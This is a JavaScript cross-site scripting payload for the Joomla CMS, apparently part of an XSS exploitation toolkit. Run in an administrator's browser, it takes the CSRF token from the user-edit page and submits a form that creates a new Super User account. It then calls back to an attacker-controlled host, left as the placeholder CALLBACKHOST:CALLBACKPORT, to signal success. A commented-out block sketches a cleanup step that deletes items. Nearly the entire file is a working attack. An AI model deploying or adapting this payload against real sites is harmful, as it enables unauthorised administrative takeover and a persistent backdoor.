/*
Title: Joomla Core Payload (New Admin User)
Author: Hans-Michael Varbaek
Company: VarBITS

Version: 2.75

Changelog:
- Ver 2.75 : A few minor improvements.
- Ver 2.5  : First release.

Special Credits: Gökmen Güreçi, Muhammet Dilmaç and Sense of Security (Version 2.5)

For ethical and legal purposes only. This script is provided as is and without warranty.

TODO:
- For pre-existing forms, consider using FormData to read and update/set new values in the future:
https://developer.mozilla.org/en-US/docs/Web/API/FormData/Using_FormData_Objects
https://developer.mozilla.org/en-US/docs/Web/API/FormData
https://developer.mozilla.org/en-US/docs/Web/API/FormData/set
-- Update this payload, or add a new payload that uses FormData() and XMLHttpRequest()
*/

var request = new XMLHttpRequest(); // Initial request to get CSRF token
var req = new XMLHttpRequest(); // Subsequent request to inject new user
var id = '';
var boundary = Math.random().toString().substr(2);
var space = "-----------------------------";

request.open('GET', 'index.php?option=com_users&view=user&layout=edit', true);
request.onload = function() {
    if (request.status >= 200 && request.status < 400) {
        var resp = request.responseText;
        var myRegex = /<input type="hidden" name="([a-z0-9]+)" value="1" \/>/;
        id = myRegex.exec(resp)[1];
        req.open('POST', 'index.php?option=com_users&layout=edit&id=0', true);
        req.setRequestHeader("content-type", "multipart/form-data; boundary=---------------------------" + boundary);
        var multipart = space + boundary +
            "\r\nContent-Disposition: form-data; name=\"jform[name]\"" +
            "\r\n\r\nVAR_SHOWN_NAME\r\n" +
            space + boundary +
            "\r\nContent-Disposition: form-data; name=\"jform[username]\"" +
            "\r\n\r\nVAR_USER_NAME\r\n" +
            space + boundary +
            "\r\nContent-Disposition: form-data; name=\"jform[password]\"" +
            "\r\n\r\nVAR_PASSWORD_1\r\n" +
            space + boundary +
            "\r\nContent-Disposition: form-data; name=\"jform[password2]\"" +
            "\r\n\r\nVAR_PASSWORD_2\r\n" +
            space + boundary +
            "\r\nContent-Disposition: form-data; name=\"jform[email]\"" +
            "\r\n\r\nVAR_EMAIL\r\n" +
            space + boundary +
            "\r\nContent-Disposition: form-data; name=\"jform[registerDate]\"" +
            "\r\n\r\n\r\n" +
            space + boundary +
            "\r\nContent-Disposition: form-data; name=\"jform[lastvisitDate]\"" +
            "\r\n\r\n\r\n" +
            space + boundary +
            "\r\nContent-Disposition: form-data; name=\"jform[lastResetTime]\"" +
            "\r\n\r\n\r\n" +
            space + boundary +
            "\r\nContent-Disposition: form-data; name=\"jform[resetCount]\"" +
            "\r\n\r\n0\r\n" +
            space + boundary +
            "\r\nContent-Disposition: form-data; name=\"jform[sendEmail]\"" +
            "\r\n\r\n0\r\n" +
            space + boundary +
            "\r\nContent-Disposition: form-data; name=\"jform[block]\"" +
            "\r\n\r\n0\r\n" +
            space + boundary +
            "\r\nContent-Disposition: form-data; name=\"jform[requireReset]\"" +
            "\r\n\r\n0\r\n" +
            space + boundary +
            "\r\nContent-Disposition: form-data; name=\"jform[id]\"" +
            "\r\n\r\n0\r\n" +
            space + boundary +
            "\r\nContent-Disposition: form-data; name=\"jform[groups][]\"" +
            "\r\n\r\n8\r\n" +
            space + boundary +
            "\r\nContent-Disposition: form-data; name=\"jform[params][admin_style]\"" +
            "\r\n\r\n\r\n" +
            space + boundary +
            "\r\nContent-Disposition: form-data; name=\"jform[params][admin_language]\"" +
            "\r\n\r\n\r\n" +
            space + boundary +
            "\r\nContent-Disposition: form-data; name=\"jform[params][language]\"" +
            "\r\n\r\n\r\n" +
            space + boundary +
            "\r\nContent-Disposition: form-data; name=\"jform[params][editor]\"" +
            "\r\n\r\n\r\n" +
            space + boundary +
            "\r\nContent-Disposition: form-data; name=\"jform[params][helpsite]\"" +
            "\r\n\r\n\r\n" +
            space + boundary +
            "\r\nContent-Disposition: form-data; name=\"jform[params][timezone]\"" +
            "\r\n\r\n\r\n" +
            space + boundary +
            "\r\nContent-Disposition: form-data; name=\"task\"" +
            "\r\n\r\nuser.apply\r\n" +
            space + boundary +
            "\r\nContent-Disposition: form-data; name=\"" + id + "\"" +
            "\r\n\r\n1\r\n" +
            space + boundary + "--\r\n";
        req.send(multipart);
    }
};

request.send();

// Callback Notification
var request2 = new XMLHttpRequest(); // Initiate XMLHttpRequest
request2.open("GET", "http://CALLBACKHOST:CALLBACKPORT/js_shell_notify.txt");
// Method and URL to send the request to - Hostname and port are set by: xsser.py
request2.send(); // Send the request

// TODO: Fix this in a later version
// Confirmed working manually in Chrome. For some reason, it does not work when executed as a script.
/*
Maybe we need to introduce a delay?
Maybe we have to specify top.document?

    setTimeout(function() {
        clean_up();
    }, 2000);

checkboxes = document.getElementsByName('cid[]');
for(var i=0, n=checkboxes.length;i<n;i++) {
    checkboxes[i].checked = true;
}
Joomla.submitbutton('delete_all');
*/
